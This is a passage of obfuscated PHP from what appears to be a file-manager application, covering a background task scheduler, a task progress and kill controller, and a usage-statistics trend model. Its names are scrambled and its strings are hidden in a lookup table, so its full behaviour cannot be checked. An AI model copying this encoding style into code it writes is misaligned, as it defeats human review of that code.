self::valueGet($ôıöµ……ºÑ[1546]); if (time() - $òÉ»Ÿ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($ôıöµ……ºÑ[1545], $ôıöµ……ºÑ[87]); Hook::bind($ôıöµ……ºÑ[1547], $ôıöµ……ºÑ[1548]); while (!0) { self::cacheClear(); if (self::valueGet($ôıöµ……ºÑ[745]) != $ôıöµ……ºÑ[87]) { self::valueSet($ôıöµ……ºÑ[1545], $ôıöµ……ºÑ[191]); self::log($ôıöµ……ºÑ[1549]); die; } self::valueSet(array($ôıöµ……ºÑ[1545] => $ôıöµ……ºÑ[87], $ôıöµ……ºÑ[1546] => time()), !1); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $äÒŠßï =& $_SERVER[èÍ×öˆøÉ]; http_close(); self::valueSet($äÒŠßï[745], $äÒŠßï[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($äÒŠßï[1545] => $äÒŠßï[191], $äÒŠßï[745] => $äÒŠßï[87]), !1); } public static function shutdownEvent() { $Ã† =& $_SERVER[èÍ×öˆøÉ]; self::valueSet($Ã†[1545], $Ã†[191]); self::log($Ã†[1550]); } public static function config($¤öĞ¡Â‘, $ù©µõØ) { self::valueSet($_SERVER[èÍ×öˆøÉ][745], $¤öĞ¡Â‘); } private static function taskRunAll() { $Çğ– =& $_SERVER[èÍ×öˆøÉ]; $–¥ÈÒÇŒÉ = timeFloat(); $ôçïãù® = Model($Çğ–[1551])->listData(); $®˜‰Ş¹©êˆ„È = count($ôçïãù®); for ($ğó¶š“÷íØ = 0; $ğó¶š“÷íØ < $®˜‰Ş¹©êˆ„È; $ğó¶š“÷íØ++) { $‚ø¨Ğ±™²şş = $ôçïãù®[$ğó¶š“÷íØ]; if (!$‚ø¨Ğ±™²şş[$Çğ–[395]] || $‚ø¨Ğ±™²şş[$Çğ–[1552]] != $Çğ–[87]) { continue; } if (!self::taskTimeCheck($‚ø¨Ğ±™²şş)) { continue; } self::taskRun($‚ø¨Ğ±™²şş); } Hook::trigger($Çğ–[1553]); self::taskQueueRun($–¥ÈÒÇŒÉ); } private static function taskQueueRun($¼˜¸) { $œ’×¬ = 10; while (!0) { $´ŠÜ = TaskQueue::run(); if ($´ŠÜ === !1) { break; } if (timeFloat() - $¼˜¸ >= $œ’×¬) { break; } } } private static function taskTimeCheck($ˆÙ„ØşÈŸì) { $Éõ¹¤ =& $_SERVER[èÍ×öˆøÉ]; $ÁÏ = json_decode($ˆÙ„ØşÈŸì[$Éõ¹¤[197]], !0); $×ÃßŞ¢Ç£ğè = intval($ˆÙ„ØşÈŸì[$Éõ¹¤[1546]]); $¸ëœºòŠ†Î³ï = strtotime($Éõ¹¤[1554] . $ÁÏ[$Éõ¹¤[1555]] . $Éõ¹¤[1556]) - strtotime($Éõ¹¤[1557]); $ö‡œÆá = time() - strtotime(date($Éõ¹¤[1558]) . $Éõ¹¤[1559]); $Çìš´®Ò·Î¼² = $ö‡œÆá >= $¸ëœºòŠ†Î³ï && $ö‡œÆá <= $¸ëœºòŠ†Î³ï + 3600; switch ($ÁÏ[$Éõ¹¤[29]]) { case $Éõ¹¤[1560]: if (time() - $×ÃßŞ¢Ç£ğè < 3600 * 24 * 30) { return !1; } if ($ÁÏ[$Éõ¹¤[1560]] == date($Éõ¹¤[1561]) && $Çìš´®Ò·Î¼²) { return !0; } break; case $Éõ¹¤[1562]: if (time() - $×ÃßŞ¢Ç£ğè < 3600 * 24 * 7) { return !1; } $¡â‘ÄüÆÓíÖ = date($Éõ¹¤[1563]) == 0 ? 7 : date($Éõ¹¤[1563]); if ($ÁÏ[$Éõ¹¤[1562]] == $¡â‘ÄüÆÓíÖ && $Çìš´®Ò·Î¼²) { return !0; } break; case $Éõ¹¤[1555]: if (time() - $×ÃßŞ¢Ç£ğè < 3600 * 24) { return !1; } if ($Çìš´®Ò·Î¼²) { return !0; } break; case $Éõ¹¤[1564]: if (time() - $×ÃßŞ¢Ç£ğè >= floatval($ÁÏ[$Éõ¹¤[1564]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÚšŸì¸ÇÊ =& $_SERVER[èÍ×öˆøÉ]; static $¹İÇ = 0; $ç¸ ÌıØÎ¢ğ = 300; if (!$¹İÇ) { $¹İÇ = time(); } if (time() - $¹İÇ < $ç¸ ÌıØÎ¢ğ) { return; } $¹İÇ = time(); $âñ‚›Şå‡½ŸÚ = Model($ÚšŸì¸ÇÊ[507])->db($ÚšŸì¸ÇÊ[33]); if ($âñ‚›Şå‡½ŸÚ) { $âñ‚›Şå‡½ŸÚ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($ÚšŸì¸ÇÊ[1565], $ÚšŸì¸ÇÊ[1566]); die; } } public static function taskRun($ÅªğíÆÅ¢ÌŸ) { $úÚ“ =& $_SERVER[èÍ×öˆøÉ]; self::log($úÚ“[1567] . $ÅªğíÆÅ¢ÌŸ[$úÚ“[395]] . $úÚ“[1568] . $ÅªğíÆÅ¢ÌŸ[$úÚ“[28]] . $úÚ“[1569] . $ÅªğíÆÅ¢ÌŸ[$úÚ“[1570]]); Model($úÚ“[1551])->run($ÅªğíÆÅ¢ÌŸ[$úÚ“[395]]); $‹ÆĞÉ“º„ƒ¸µ = timeFloat(); $°»ê = $úÚ“[33]; switch ($ÅªğíÆÅ¢ÌŸ[$úÚ“[29]]) { case $úÚ“[305]: $¢‡¦¤¯Ë¬Ã = url_request($ÅªğíÆÅ¢ÌŸ[$úÚ“[1570]], $úÚ“[228], !1, !1, !1, !1, 10); if ($¢‡¦¤¯Ë¬Ã[$úÚ“[745]]) { $°»ê = strlen($¢‡¦¤¯Ë¬Ã[$úÚ“[1126]]); } break; case $úÚ“[227]: $°»ê = Hook::apply($ÅªğíÆÅ¢ÌŸ[$úÚ“[1570]]); default: break; } Model($úÚ“[1571])->add(array($úÚ“[1572] => $úÚ“[33], $úÚ“[1573] => $úÚ“[191], $úÚ“[29] => $úÚ“[1574] . $ÅªğíÆÅ¢ÌŸ[$úÚ“[395]], $úÚ“[1575] => json_encode(array($úÚ“[28] => $ÅªğíÆÅ¢ÌŸ[$úÚ“[28]], $úÚ“[1576] => timeFloat() - $‹ÆĞÉ“º„ƒ¸µ, $úÚ“[291] => $°»ê)))); $ü©‚Ç‰Íó = $°»ê ? $úÚ“[1577] . $°»ê : $úÚ“[33]; self::log($úÚ“[1578] . $ÅªğíÆÅ¢ÌŸ[$úÚ“[395]] . $úÚ“[530] . $ü©‚Ç‰Íó); return !0; } private static function valueGet($¾¼ñÕŒêÊ) { $ÅÓÚŸ =& $_SERVER[èÍ×öˆøÉ]; $Œ¦½¡ı = $ÅÓÚŸ[1579]; $¸şğ“Ìö = Model($ÅÓÚŸ[427])->get($¾¼ñÕŒêÊ, $Œ¦½¡ı); if (is_null($¸şğ“Ìö)) { Model($ÅÓÚŸ[427])->set($ÅÓÚŸ[745], $ÅÓÚŸ[87], $Œ¦½¡ı); Model($ÅÓÚŸ[427])->set($ÅÓÚŸ[1545], $ÅÓÚŸ[191], $Œ¦½¡ı); $¸şğ“Ìö = Model($ÅÓÚŸ[427])->get($¾¼ñÕŒêÊ, $Œ¦½¡ı); } return $¸şğ“Ìö; } private static function valueSet($İéöàÂ, $Ö») { $Õæ”Šöã×í§ =& $_SERVER[èÍ×öˆøÉ]; $·“íùŞİş = $Õæ”Šöã×í§[1580]; CacheLock::lock($·“íùŞİş); $ë¥ = Model($Õæ”Šöã×í§[427])->set($İéöàÂ, $Ö», $Õæ”Šöã×í§[1579]); CacheLock::unlock($·“íùŞİş); return $ë¥; } protected static function log($¨£â) { write_log($¨£â, $_SERVER[èÍ×öˆøÉ][1566]); } private static function cacheClear() { $×• =& $_SERVER[èÍ×öˆøÉ]; Cache::clearMemory(Model($×•[427])->cacheKey($×•[1579])); Cache::clearMemory(Model($×•[427])->cacheKey($×•[1581])); Model($×•[1551])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\156\x69\x6e\147"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($“¥, $Š£ = '', $£…×ç• = 0, $½×»ş‹‰ = '') { $­ìĞºìÇŞ°¨ =& $_SERVER[èÍ×öˆøÉ]; if (self::get($“¥)) { return; } $this->task = array($­ìĞºìÇŞ°¨[395] => $“¥, $­ìĞºìÇŞ°¨[1582] => USER_ID, $­ìĞºìÇŞ°¨[1485] => $½×»ş‹‰, $­ìĞºìÇŞ°¨[29] => $Š£, $­ìĞºìÇŞ°¨[1062] => $­ìĞºìÇŞ°¨[33], $­ìĞºìÇŞ°¨[1060] => $£…×ç•, $­ìĞºìÇŞ°¨[1074] => 0, $­ìĞºìÇŞ°¨[1583] => 0, $­ìĞºìÇŞ°¨[1584] => 0, $­ìĞºìÇŞ°¨[784] => timeFloat(), $­ìĞºìÇŞ°¨[783] => 0, $­ìĞºìÇŞ°¨[1585] => 0, $­ìĞºìÇŞ°¨[1586] => 0, $­ìĞºìÇŞ°¨[1587] => 0, $­ìĞºìÇŞ°¨[745] => $­ìĞºìÇŞ°¨[1545]); $GLOBALS[$­ìĞºìÇŞ°¨[1588]] = 1; Hook::bind($­ìĞºìÇŞ°¨[1547], array($this, $­ìĞºìÇŞ°¨[1589])); Hook::bind($­ìĞºìÇŞ°¨[1590], array($this, $­ìĞºìÇŞ°¨[1591])); $this->startAfter(); Hook::trigger($­ìĞºìÇŞ°¨[1592], $this->task); $this->task[$­ìĞºìÇŞ°¨[1585]] = timeFloat(); } public function end() { $ËöÌéù‰ôçµ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->task) { return; } if ($this->task[$ËöÌéù‰ôçµ[1585]]) { self::valueSet($this->task[$ËöÌéù‰ôçµ[395]], !1); } $öõÍ = timeFloat() - $this->task[$ËöÌéù‰ôçµ[784]]; self::log($ËöÌéù‰ôçµ[1593] . $this->task[$ËöÌéù‰ôçµ[395]] . $ËöÌéù‰ôçµ[1594] . $öõÍ . $ËöÌéù‰ôçµ[1595]); Hook::unbind($ËöÌéù‰ôçµ[1547], array($this, $ËöÌéù‰ôçµ[1589])); Hook::unbind($ËöÌéù‰ôçµ[1590], array($this, $ËöÌéù‰ôçµ[1591])); $this->endAfter(); $this->task = !1; } public function update($ÒÍâ®³ó = 0, $ Ğ½í±†Í = false) { $Üãœƒ¨ÕüÂ™ =& $_SERVER[èÍ×öˆøÉ]; $ÏéÊ³¨â =& $this->task; if (!$ÏéÊ³¨â) { return; } $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1074]] += $ÒÍâ®³ó; $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[783]] = timeFloat(); if ($ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1060]]) { if ($ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1060]] < $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1074]]) { $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1060]] = $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1074]]; } $ô†ú†‘Ìã¸ø… = timeFloat() - $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[784]] - $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1586]]; $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1583]] = $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1074]] / $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1060]]; $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1584]] = $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1074]] / $ô†ú†‘Ìã¸ø…; if ($ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1583]] > 0) { $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1587]] = $ô†ú†‘Ìã¸ø… * (1 - $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1583]]) / $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1583]]; } $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1587]] = $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1587]] <= 0 ? 0 : $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1587]]; } $this->updateAfter(); $ƒ‡ŞƒÙÌ£ = 0.2; if (timeFloat() - $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1585]] < $ƒ‡ŞƒÙÌ£ && !$ Ğ½í±†Í) { return; } $Œ±¨ = self::get($ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[395]]); $¨†Î½•îô = $Œ±¨[$Üãœƒ¨ÕüÂ™[745]]; if ($¨†Î½•îô == self::STATYS_KILL) { $£ú†ï = array($Üãœƒ¨ÕüÂ™[1596] => LNG($Üãœƒ¨ÕüÂ™[1597]), $Üãœƒ¨ÕüÂ™[1124] => !1); Cache::set($Üãœƒ¨ÕüÂ™[1598] . $this->task[$Üãœƒ¨ÕüÂ™[395]], $£ú†ï, 30); $this->onKill(); $this->end(); die; } else { if ($¨†Î½•îô == self::STATYS_STOP) { $”Ú³Ê‡Ã = 2; $Œ±¨[$Üãœƒ¨ÕüÂ™[1586]] += $”Ú³Ê‡Ã; self::valueSet($ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[395]], $Œ±¨); sleep($”Ú³Ê‡Ã); $this->update(); return; } } $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[745]] = $¨†Î½•îô ? $¨†Î½•îô : $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[745]]; $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1586]] = $Œ±¨[$Üãœƒ¨ÕüÂ™[1586]] ? $Œ±¨[$Üãœƒ¨ÕüÂ™[1586]] : 0; $ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[1585]] = timeFloat(); Hook::trigger($Üãœƒ¨ÕüÂ™[1599], $ÏéÊ³¨â); self::valueSet($ÏéÊ³¨â[$Üãœƒ¨ÕüÂ™[395]], $ÏéÊ³¨â); } public function onKillSet($›…íÏËŒ, $Ñ¥ = array()) { $this->onKillCall = array($›…íÏËŒ, $Ñ¥); } public function onKill() { $¤ş¢Ùˆ§Ùê¶ø =& $_SERVER[èÍ×öˆøÉ]; self::log($¤ş¢Ùˆ§Ùê¶ø[1593] . $this->task[$¤ş¢Ùˆ§Ùê¶ø[395]] . $¤ş¢Ùˆ§Ùê¶ø[1600]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($µÅ÷) { $»¿ =& $_SERVER[èÍ×öˆøÉ]; Cache::set($»¿[1598] . $this->task[$»¿[395]], $µÅ÷, 60); return $µÅ÷; } public static function get($¬ ˜Š) { $Ä€ÊÕˆ’Ú =& $_SERVER[èÍ×öˆøÉ]; $†ç¨õ = self::valueGet($¬ ˜Š); if (is_array($†ç¨õ) && $†ç¨õ[$Ä€ÊÕˆ’Ú[1601]]) { $õª– = ActionApply($†ç¨õ[$Ä€ÊÕˆ’Ú[1601]], array($†ç¨õ)); $†ç¨õ = is_array($õª–) ? $õª– : $†ç¨õ; } return $†ç¨õ; } public static function listData() { $½§§øØÚ‹ = self::valueGet(); return array_sort_by($½§§øØÚ‹, $_SERVER[èÍ×öˆøÉ][784], !0); } public static function kill($Ÿ´‹øüúîÈ) { return self::changeStatus($Ÿ´‹øüúîÈ, self::STATYS_KILL); } public static function stop($®æü¨†·ÈÑë) { return self::changeStatus($®æü¨†·ÈÑë, self::STATYS_STOP); } public static function restart($Ò‚¿Ï) { return self::changeStatus($Ò‚¿Ï, self::STATYS_RUNNING); } public static function killAll() { $âÈ¤¢ù¼Á£‰ø =& $_SERVER[èÍ×öˆøÉ]; $ÙİúŒ¿èá‘† = self::listData(); foreach ($ÙİúŒ¿èá‘† as $Ÿ±ü) { self::kill($Ÿ±ü[$âÈ¤¢ù¼Á£‰ø[395]]); } sleep(2); foreach ($ÙİúŒ¿èá‘† as $Ÿ±ü) { self::valueSet($Ÿ±ü[$âÈ¤¢ù¼Á£‰ø[395]], !1); } } private static function changeStatus($©İ, $®ÓÃû–) { $”½ãš²Ã =& $_SERVER[èÍ×öˆøÉ]; $®ğÈŸşÎí = self::valueGet($©İ); if (!$®ğÈŸşÎí) { return !1; } $®ğÈŸşÎí[$”½ãš²Ã[745]] = $®ÓÃû–; self::valueSet($©İ, $®ğÈŸşÎí); self::log($”½ãš²Ã[1602] . $®ğÈŸşÎí[$”½ãš²Ã[395]] . $”½ãš²Ã[1603] . $®ÓÃû–); return !0; } public static function valueGet($›İù¡ñ¼½ = false) { $ÈŠß =& $_SERVER[èÍ×öˆøÉ]; if ($›İù¡ñ¼½) { $×âö£Ì¨è = Model($ÈŠß[439])->where(array($ÈŠß[93] => $›İù¡ñ¼½, $ÈŠß[29] => $ÈŠß[1604]))->find(); return $×âö£Ì¨è ? json_decode($×âö£Ì¨è[$ÈŠß[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($÷Ú = false) { $™Ò =& $_SERVER[èÍ×öˆøÉ]; $ïûü†Ê× = array($™Ò[29] => $™Ò[1604]); if ($÷Ú) { $ïûü†Ê×[$™Ò[1582]] = $÷Ú; } $õÆî—É = Model($™Ò[439])->where($ïûü†Ê×)->select(); $õÆî—É = $õÆî—É ? $õÆî—É : array(); foreach ($õÆî—É as $¥” => $àÆ¼şÈ‚Ë) { $õÆî—É[$¥”] = json_decode($àÆ¼şÈ‚Ë[$™Ò[372]], !0); } return $õÆî—É; } public static function valueSet($ëšÜ, $ø¢Œ™›‡§Á‚) { $©×ùÔ‘ùÎİà® =& $_SERVER[èÍ×öˆøÉ]; if (!$ø¢Œ™›‡§Á‚) { return Model($©×ùÔ‘ùÎİà®[439])->where(array($©×ùÔ‘ùÎİà®[93] => $ëšÜ, $©×ùÔ‘ùÎİà®[29] => $©×ùÔ‘ùÎİà®[1604]))->delete(); } $ĞÍ™ø = json_encode($ø¢Œ™›‡§Á‚); if (!$ĞÍ™ø) { ob_start(); var_dump($ø¢Œ™›‡§Á‚); $Ç‚ŞÛ¨ÂÌò = ob_get_clean(); self::log($©×ùÔ‘ùÎİà®[1605] . json_encode_force($Ç‚ŞÛ¨ÂÌò)); } if (!$ëšÜ || !$ø¢Œ™›‡§Á‚[$©×ùÔ‘ùÎİà®[395]]) { return !1; } $œˆ¼’ÊáÕ = array($©×ùÔ‘ùÎİà®[29] => $©×ùÔ‘ùÎİà®[1604], $©×ùÔ‘ùÎİà®[1582] => USER_ID, $©×ùÔ‘ùÎİà®[93] => $ëšÜ, $©×ùÔ‘ùÎİà®[372] => $ĞÍ™ø); $Ì†·›ë§ = $©×ùÔ‘ùÎİà®[1606]; CacheLock::lock($Ì†·›ë§); Model($©×ùÔ‘ùÎİà®[439])->add($œˆ¼’ÊáÕ, array(), !0); CacheLock::unlock($Ì†·›ë§); } public static function log($ÌÛ·ã¬ŸŠ) { if (!GLOBAL_DEBUG) { return; } write_log($ÌÛ·ã¬ŸŠ, $_SERVER[èÍ×öˆøÉ][1607]); } } goto c¬ «ƒáó×; A«É’¡ù˜„: class AnalysisModel extends ModelBaseLight { public function init($š¾ƒ»‹¢ÍËá­) { $Ñ¢³ò‘ Û©Ñ =& $_SERVER[èÍ×öˆøÉ]; $ÆÙµË = array($Ñ¢³ò‘ Û©Ñ[588] => array($Ñ¢³ò‘ Û©Ñ[29] => $Ñ¢³ò‘ Û©Ñ[1677], $Ñ¢³ò‘ Û©Ñ[271] => array($Ñ¢³ò‘ Û©Ñ[222], $Ñ¢³ò‘ Û©Ñ[760], $Ñ¢³ò‘ Û©Ñ[1678], $Ñ¢³ò‘ Û©Ñ[1679])), $Ñ¢³ò‘ Û©Ñ[1680] => array($Ñ¢³ò‘ Û©Ñ[29] => $Ñ¢³ò‘ Û©Ñ[1681], $Ñ¢³ò‘ Û©Ñ[271] => array($Ñ¢³ò‘ Û©Ñ[222], $Ñ¢³ò‘ Û©Ñ[758], $Ñ¢³ò‘ Û©Ñ[1682], $Ñ¢³ò‘ Û©Ñ[1683], $Ñ¢³ò‘ Û©Ñ[1684]))); if (!isset($ÆÙµË[$š¾ƒ»‹¢ÍËá­])) { return !1; } $this->optionType = $ÆÙµË[$š¾ƒ»‹¢ÍËá­][$Ñ¢³ò‘ Û©Ñ[29]]; $this->field = $ÆÙµË[$š¾ƒ»‹¢ÍËá­][$Ñ¢³ò‘ Û©Ñ[271]]; return !0; } public function listData($ë½‡Î¥Á¨û = false, $Ö’à£ñÆó ï = "\x6d\157\x64\x69\x66\171\124\x69\x6d\145", $›·ËàñŸ» = false) { return parent::listData($ë½‡Î¥Á¨û, $Ö’à£ñÆó ï, $›·ËàñŸ»); } public function trendList($Í¿æ¬) { $Üòæ®ØµÌà =& $_SERVER[èÍ×öˆøÉ]; $ù¿È›¢Ì¶ = $this->listData(); if ($ù¿È›¢Ì¶) { $ñù¶í®ß§¤â = end($ù¿È›¢Ì¶); $‡°îïÖˆ = date($Üòæ®ØµÌà[1685], strtotime($Üòæ®ØµÌà[1686])); if ($ñù¶í®ß§¤â[$Üòæ®ØµÌà[222]] == $‡°îïÖˆ) { return $ù¿È›¢Ì¶; } $Ô¤ = strtotime($ñù¶í®ß§¤â[$Üòæ®ØµÌà[222]]); } if (!isset($Ô¤)) { $©İ‚ÑÔÇ¥Ø°‚ = $Í¿æ¬ == $Üòæ®ØµÌà[588] ? $Üòæ®ØµÌà[532] : $Üòæ®ØµÌà[827]; $Ô¤ = Model($©İ‚ÑÔÇ¥Ø°‚)->min($Üòæ®ØµÌà[194]); } $È«ŞßËÚùÉ = $Üòæ®ØµÌà[1687] . ucfirst($Í¿æ¬); $Öà = $this->dateList($Ô¤); foreach ($Öà as $‡°îïÖˆ) { $this->{$È«ŞßËÚùÉ}($‡°îïÖˆ); } return $this->listData(); } private function dateList($Ûœ›ô¨÷Â£Æß) { $ÁçàµÑ =& $_SERVER[èÍ×öˆøÉ]; $Ğí = $Ûœ›ô¨÷Â£Æß; $¾Û‡÷áØù–ş = strtotime($ÁçàµÑ[1686]); $ÒÎùè· = array(); while ($Ğí <= $¾Û‡÷áØù–ş) { $ÒÎùè·[] = date($ÁçàµÑ[1685], $Ğí); $Ğí = strtotime($ÁçàµÑ[1688], $Ğí); } return $ÒÎùè·; } public function _recordUser($æ³¬Ú“ù = '') { $²ê©‚Ò€ =& $_SERVER[èÍ×öˆøÉ]; $í‡Å®–§Ôğ = strtotime(date($²ê©‚Ò€[1689], strtotime($æ³¬Ú“ù))); $íâ = strtotime(date($²ê©‚Ò€[1690], strtotime($æ³¬Ú“ù))); $¤Æ‹ÌàÍ = array($²ê©‚Ò€[194] => array($²ê©‚Ò€[1010], $íâ)); $÷Îû¡ = Model($²ê©‚Ò€[532])->where($¤Æ‹ÌàÍ)->count($²ê©‚Ò€[1582]); $¤Æ‹ÌàÍ[$²ê©‚Ò€[194]] = array($²ê©‚Ò€[331], array($í‡Å®–§Ôğ, $íâ)); $†›ÕÚ•ø = Model($²ê©‚Ò€[532])->where($¤Æ‹ÌàÍ)->count($²ê©‚Ò€[1582]); $¤Æ‹ÌàÍ[$²ê©‚Ò€[29]] = $²ê©‚Ò€[1691]; $ˆÃ•—ª¡Ö = Model($²ê©‚Ò€[1692])->where($¤Æ‹ÌàÍ)->count($²ê©‚Ò€[1693]); $ĞÁÓ«éÄ“á = array($²ê©‚Ò€[222] => $æ³¬Ú“ù, $²ê©‚Ò€[760] => (int) $÷Îû¡, $²ê©‚Ò€[1678] => (int) $†›ÕÚ•ø, $²ê©‚Ò€[1679] => (int) $ˆÃ•—ª¡Ö); return $this->insert($ĞÁÓ«éÄ“á); } public function _recordStore($ü»è´šçëÌõŠ = '') { $¥À =& $_SERVER[èÍ×öˆøÉ]; $ŒÙàˆô¨½ = strtotime(date($¥À[1690], strtotime($ü»è´šçëÌõŠ))); $Áîáûé = array($¥À[194] => array($¥À[1010], $ŒÙàˆô¨½)); $Ê“ = Model($¥À[464])->where($Áîáûé)->sum($¥À[78]); $Áîáûé[$¥À[405]] = 0; $àôù² = Model($¥À[827])->where($Áîáûé)->sum($¥À[78]); $Áîáûé[$¥À[406]] = 1; $™ë½…À = Model($¥À[827])->where($Áîáûé)->sum($¥À[78]); $Áîáûé[$¥À[406]] = 2; $Û“å = Model($¥À[827])->where($Áîáûé)->sum($¥À[78]); $¸” = array($¥À[222] => $ü»è´šçëÌõŠ, $¥À[758] => (int) $àôù², $¥À[1682] => (int) $Ê“, $¥À[1683] => (int) $™ë½…À, $¥À[1684] => (int) $Û“å); return $this->insert($¸”); } public function trend($êÅîà¥ã¿‹, $æ¥¸«İµøÈş) { $³ö =& $_SERVER[èÍ×öˆøÉ]; if (!$this->init($êÅîà¥ã¿‹)) { return !1; } $š“ôĞÃ±†¼ = $this->trendList($êÅîà¥ã¿‹); if ($š“ôĞÃ±†¼ && $æ¥¸«İµøÈş != $³ö[1555]) { $œ’«¡ ìˆ = $š“ôĞÃ±†¼[0][$³ö[222]]; $Ò¡–öÙ¥Ó¦ = $this->validDate($æ¥¸«İµøÈş, $œ’«¡ ìˆ); $Ä¤ûœ´†Ş¹œ = array(); $™Ìş‰×¿è® = array_to_keyvalue($š“ôĞÃ±†¼, $³ö[222]); foreach ($Ò¡–öÙ¥Ó¦ as $Ñ·) { if (isset($™Ìş‰×¿è®[$Ñ·])) { $ü¶ = $™Ìş‰×¿è®[$Ñ·]; } else { $ü¶ = end($š“ôĞÃ±†¼); $ü¶[$³ö[222]] = $Ñ·; if ($êÅîà¥ã¿‹ == $³ö[588]) { $ü¶[$³ö[1678]] = $ü¶[$³ö[1679]] = 0; } } $Ä¤ûœ´†Ş¹œ[] = $ü¶; } $š“ôĞÃ±†¼ = $Ä¤ûœ´†Ş¹œ; } $ªçÛÒïç = array($³ö[588] => array($³ö[760] => LNG($³ö[1694]), $³ö[1678] => LNG($³ö[1695]), $³ö[1679] => LNG($³ö[1696])), $³ö[1680] => array($³ö[758] => LNG($³ö[1697]), $³ö[1682] => LNG($³ö[1698]), $³ö[1683] => LNG($³ö[1699]), $³ö[1684] => LNG($³ö[1700]))); $ÚĞ×Ú = array($³ö[588] => $³ö[1701], $³ö[1680] => $³ö[78]); if (empty($š“ôĞÃ±†¼)) { $Ñ· = date($³ö[1685], strtotime($³ö[1686])); $©®‰Š = array($³ö[222] => $Ñ·); foreach ($ªçÛÒïç[$êÅîà¥ã¿‹] as $¯ŠÒò => $àÙÀë¼à–¼) { $©®‰Š[$¯ŠÒò] = 0; } $š“ôĞÃ±†¼[] = $©®‰Š; } $´İó¹€ì¶Ù¶Ÿ = array(); foreach ($š“ôĞÃ±†¼ as $àÙÀë¼à–¼) { if ($êÅîà¥ã¿‹ == $³ö[1680] && $àÙÀë¼à–¼[$³ö[1682]] > $àÙÀë¼à–¼[$³ö[758]]) { $àÙÀë¼à–¼[$³ö[1682]] = $àÙÀë¼à–¼[$³ö[758]]; } foreach ($ªçÛÒïç[$êÅîà¥ã¿‹] as $¯ŠÒò => $ŸŒÃàé’À) { $ü¶ = array($³ö[222] => $àÙÀë¼à–¼[$³ö[222]], $³ö[1485] => $ŸŒÃàé’À); $ü¶[$ÚĞ×Ú[$êÅîà¥ã¿‹]] = isset($àÙÀë¼à–¼[$¯ŠÒò]) ? $àÙÀë¼à–¼[$¯ŠÒò] : 0; $´İó¹€ì¶Ù¶Ÿ[] = $ü¶; } } return $´İó¹€ì¶Ù¶Ÿ; } public function validDate($ëÉ°ù˜ï, $æ¡éëó) { $’İÚŸ =& $_SERVER[èÍ×öˆøÉ]; $Œİ·Ï€øÔûË = date($’İÚŸ[1685], strtotime($’İÚŸ[1686])); $™ŞÌÎ½û = array($Œİ·Ï€øÔûË); switch ($ëÉ°ù˜ï) { case $’İÚŸ[1562]: $Ùş¯óƒ = mktime(0, 0, 0, date($’İÚŸ[1702]), date($’İÚŸ[1303]) - date($’İÚŸ[1366]) + 7 - 7, date($’İÚŸ[1703])); $–Óë¬é‹Üê = 0; do { $¨ ŞÀˆœ¤ = date($’İÚŸ[1685], $Ùş¯óƒ - 3600 * 24 * 7 * $–Óë¬é‹Üê); $™ŞÌÎ½û[] = $¨ ŞÀˆœ¤; $–Óë¬é‹Üê++; } while ($æ¡éëó < $¨ ŞÀˆœ¤); break; case $’İÚŸ[1560]: $–Óë¬é‹Üê = 1; do { $ÆÄÉä Ê‡ = date($’İÚŸ[1704], strtotime("\55\40{$–Óë¬é‹Üê}\40\x6d\157\156\164\150\x73")); $™ŞÌÎ½û[] = $ÆÄÉä Ê‡; $–Óë¬é‹Üê++; } while ($æ¡éëó < $ÆÄÉä Ê‡); break; case $’İÚŸ[1705]: $¾Ñ = (int) date($’İÚŸ[1703], strtotime($æ¡éëó)); $ß‘ÛÉ‘Åîò°‰ = (int) date($’İÚŸ[1703]); if ($¾Ñ >= $ß‘ÛÉ‘Åîò°‰) { break; } for ($¾Ñ; $¾Ñ < $ß‘ÛÉ‘Åîò°‰; $¾Ñ++) { $™ŞÌÎ½û[] = $¾Ñ . $’İÚŸ[1706]; } break; default: break; } if ($æ¡éëó > end($™ŞÌÎ½û)) { array_pop($™ŞÌÎ½û); } sort($™ŞÌÎ½û); return $™ŞÌÎ½û; } public function listTable($ø°) { $Ù´îÃÑú´¥ùÕ = ucfirst($ø°); return Model($Ù´îÃÑú´¥ùÕ)->listData(); } public function option($ÔÎóªÓ) { $ì„È²Ò¶ = 